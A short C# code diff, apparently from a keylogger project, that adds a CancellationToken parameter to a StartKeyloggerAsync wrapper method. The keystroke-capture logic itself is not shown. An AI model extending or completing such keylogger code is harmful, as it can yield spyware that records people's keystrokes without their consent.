@@ -1941,8 +1941,8 @@
             }
         }
 
-        public static Task StartKeyloggerAsync() =>
-            Task.Factory.StartNew(() => StartKeylogger());
+        public static Task StartKeyloggerAsync(CancellationToken cancellationToken) =>
+            Task.Factory.StartNew(() => StartKeylogger(), cancellationToken);
 
         //{
         //    Console.WriteLine("Starting keylogger...");
